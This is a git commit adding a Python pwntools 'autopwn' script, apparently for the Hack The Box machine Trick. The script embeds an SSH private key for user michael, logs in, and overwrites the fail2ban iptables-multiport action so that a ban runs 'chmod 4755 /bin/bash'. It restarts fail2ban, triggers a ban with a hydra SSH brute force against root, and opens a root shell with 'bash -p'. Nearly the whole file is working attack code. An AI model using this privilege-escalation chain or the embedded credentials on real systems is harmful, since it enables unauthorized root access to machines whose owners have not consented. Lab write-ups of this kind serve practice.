10786acf145785256b381c5ecbd96c1773edbc19
GatoGamer1155 <Enriquestos1155@gmail.com>
2022-06-22 15:30:19 -0500

    Add files via upload

---
+++ Trick/Trick.py
@@ -0,0 +1,48 @@
+try:
+    from pwn import *
+    print("\n[\033[1;32m+\033[1;37m] Autopwn Trick ~ GatoGamer1155\n")
+except:
+    print("\n[\033[1;31m!\033[1;37m] El script necesita privilegios de root\n\n[\033[1;31m!\033[1;37m] Recuerda tener instalada la libreria pwntools\n")
+    exit(1)
+
+def kill(sig, frame):
+    print("\n[\033[1;31m-\033[1;37m] Saliendo\n")
+    sys.exit(1)
+
+signal.signal(signal.SIGINT, kill)
+
+def bruteforce():
+    os.system("hydra 10.10.11.166 -l root -P /usr/share/wordlists/rockyou.txt ssh")
+
+rsa = ("-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz\nc4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G\nYQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+\n4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/\nUkn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4\n1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC\nDkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0\n+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE\nhkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L\njnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6\nIqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C\naUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/\nKwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC\ntnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge\nU+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0\nfHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V\nPH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS\n3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA\nfvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT\nAuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn\nIn16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP\nJkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN\njsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+\nIJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----")
+os.system('echo "%s" > key' % (rsa))
+
+c1 = b"[INCLUDES]"
+c2 = b"before = iptables-common.conf"
+c3 = b"[Definition]"
+c4 = b""
+c5 = b"actionstart = <iptables> -N f2b-<name>"
+c6 = b"              <iptables> -A f2b-<name> -j <returntype>"
+c7 = b"              <iptables> -I <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>"
+c8 = b""
+c9 = b"actionstop = <iptables> -D <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>"
+c10 = b"             <actionflush>"
+c11 = b"             <iptables> -X f2b-<name>"
+c12 = b""
+c13 = b"actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'"
+c14 = b"actionban = chmod 4755 /bin/bash"
+c15 = b"actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>"
+c16 = b"[Init]"
+
+request = ssh(host='10.10.11.166', user='michael', keyfile='key')
+shell = request.process("/bin/sh")
+shell.sendline(b"rm -rf /etc/fail2ban/action.d/iptables-multiport.conf")
+shell.sendline(b"echo '%s' >> demo.conf; echo '%s' >> demo.conf; echo '%s' >> demo.conf; echo '%s' >> demo.conf; echo '%s' >> demo.conf; echo '%s' >> demo.conf; echo '%s' >> demo.conf; echo '%s' >> demo.conf; echo '%s' >> demo.conf; echo '%s' >> demo.conf; echo '%s' >> demo.conf; echo '%s' >> demo.conf; echo '%s' >> demo.conf; echo '%s' >> demo.conf; echo '%s' >> demo.conf; echo '%s' >> demo.conf" % (c1,c2,c3,c4,c5,c6,c7,c8,c9,c10,c11,c12,c13,c14,c15,c16))
+shell.sendline(b"mv demo.conf /etc/fail2ban/action.d/iptables-multiport.conf")
+shell.sendline(b"sudo /etc/init.d/fail2ban restart")
+print("[\033[1;34m*\033[1;37m] Esto tardará 75 segundos\n")
+threading.Thread(target=bruteforce, args=()).start()
+time.sleep(75)
+shell.sendline(b"bash -p")
+shell.sendline(b"export HOME=/root TERM=xterm; cd; echo $(whoami)")
+shell.interactive()
